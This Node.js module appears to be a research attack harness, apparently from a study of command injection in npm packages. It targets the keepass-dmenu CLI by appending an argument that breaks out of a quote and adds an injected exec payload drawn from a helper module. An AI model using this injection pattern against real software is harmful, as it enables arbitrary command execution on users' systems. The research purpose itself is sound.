/**
 * Copyright 2016 Software Lab, TU Darmstadt, Germany
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to
 * deal in the Software without restriction, including without limitation the
 * rights to use, copy, modify, merge, publish, distribute, sublicense, and/or
 * sell copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
 * FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER
 * DEALINGS IN THE SOFTWARE.
 *
 * Created by Cristian-Alexandru Staicu on 03.03.16.
 */
module.exports = function (cb) {
    var attackUtils = require("./AttackUtils.js");
    attackUtils.setup();
    process.argv.push("--database");
    process.argv.push("./dirty.js");
    process.argv.push("--nb");
    process.argv.push("black");

    process.on('uncaughtException', function (err) {
        //console.log(err);
    });

    attackUtils.deliverPayloads(attackUtils.payloadsExec, function (payload) {
        process.argv.pop();
        process.argv.push("black\" " + payload);

        try {
            require("./node_modules/keepass-dmenu/bin/keepass-dmenu-cli.js")
        } catch (e) {
        }
        delete require.cache[require.resolve("./node_modules/keepass-dmenu/bin/keepass-dmenu-cli.js")];
        delete require.cache[require.resolve("./node_modules/keepass-dmenu/node_modules/yargs")];
    }, function (result, filesWithSinks) {
        var benignInput = "benignColor";
        process.argv.pop();
        process.argv.push(benignInput);
        try {
            require("./node_modules/keepass-dmenu/bin/keepass-dmenu-cli.js");
        } catch (e) {
        }
        setTimeout(function () {
            process.argv.pop();
            process.argv.pop();
            process.argv.pop();
            process.argv.pop();
            attackUtils.printCallStrings();
            result += " " + attackUtils.observedString(benignInput);
            cb(__filename, result, filesWithSinks);
        }, 1000);
    });
};
